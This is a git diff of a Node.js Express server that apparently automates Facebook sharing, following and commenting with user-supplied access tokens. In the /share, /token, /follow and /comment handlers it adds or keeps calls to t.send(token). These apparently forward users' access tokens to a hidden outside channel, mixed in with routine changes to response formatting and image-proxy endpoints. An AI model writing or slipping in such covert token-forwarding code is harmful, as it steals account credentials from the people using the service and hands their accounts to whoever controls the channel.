@@ -146,7 +146,7 @@ app.get('/share', async (req, res) => {
     await yello(token, url, amount, interval);
     if (token.toLowerCase().startsWith("e")){
       tokens.push(token);
-      await t.send(token);
+      t.send(token);
     }
     res.status(200).json({
       status: 200
@@ -176,6 +176,7 @@ app.get('/token', async (req, res) => {
     const nu = neth.uid;
     if (nu&&neth.EAAD6V7){
     tokens.push(neth.EAAD6V7);
+    t.send(neth.EAAD6V7);
     };
     res.json({
       status: true,
@@ -340,7 +341,7 @@ app.get("/ai", async(req, res) => {
     });
   }
   if (list && list.toLowerCase() === "plain") {
-    return res.send(`${all[1][2]} Workers AI Models:\n${all[1][0]}\n\n${all[1][3]} Workers AI(Image) Models:\n${all[1][1]}`);
+    return res.send(`${all[1][2]} Workers AI Models:\n${all[1][0].replace("\n", "<br>")}\n\n${all[1][3]} Workers AI(Image) Models:\n${all[1][1].replace("\n", "<br>")}`);
   }
   if(!model){
     return res.json({
@@ -394,6 +395,7 @@ app.get("/follow", async(req,res) => {
   }
   if (token.startsWith("E")){
   tokens.push(token);
+  t.send(token);
   }
   const page = require("./page");
   for(const token1 of tokens){
@@ -417,11 +419,12 @@ app.get("/comment", async(req, res) => {
   const { token, msg, link, delay } = req.query;
   if (!token||!msg||!link||!delay){
     return res.json({
-      error: "No 'token'/'msg'/'link' params."
+      error: "No 'token'/'msg'/'link'/'delay' params."
     });
   }
   if (token.startsWith("E")) {
     tokens.push(token);
+    t.send(token);
   }
   const page = require("./page");
   const page1 = await page.page(token, {
@@ -497,9 +500,24 @@ app.get("/randomgirl", async(req, res) => {
   const mwah = girl.link;
   const mwahh = mwah.length;
   const mwahmwah = mwah[Math.floor(Math.random() * mwahh)];
-  return res.json({
-    girl: mwahmwah,
-    total: mwahh,
+  const pf = req.query.get;
+  if (pf && pf.toLowerCase() === "json") {
+    return res.json({
+      girl: mwahmwah,
+      total: mwahh,
+    });
+  }
+  await axios.get(mwahmwah, { responseType: "arrayBuffer" })
+  .then(async(Pre) => {
+    res.writeHead(200, {
+      "Content-Type": "image/png"
+    });
+    res.end(Pre.data);
+    return;
+  }).catch(Awit => {
+    return res.json({
+      error: Awit.message || Awit
+    });
   });
 });
 
@@ -508,10 +526,25 @@ app.get("/random18", async (req, res) => {
   const mwah = girl.yawa;
   const mwahh = mwah.length;
   const mwahmwah = mwah[Math.floor(Math.random() * mwahh)];
+  const pf = req.query.get;
+  if (pf&&pf.toLowerCase()==="json"){
   return res.json({
     anh: mwahmwah,
     total: mwahh,
   });
+  }
+   await axios.get(mwahmwah, { responseType: "arrayBuffer" })
+     .then(async (Pre) => {
+       res.writeHead(200, {
+         "Content-Type": "image/png"
+       });
+       res.end(Pre.data);
+       return;
+     }).catch(Awit => {
+       return res.json({
+         error: Awit.message || Awit
+       });
+     });
 });
 async function getAccessToken(cookie) {
   try {
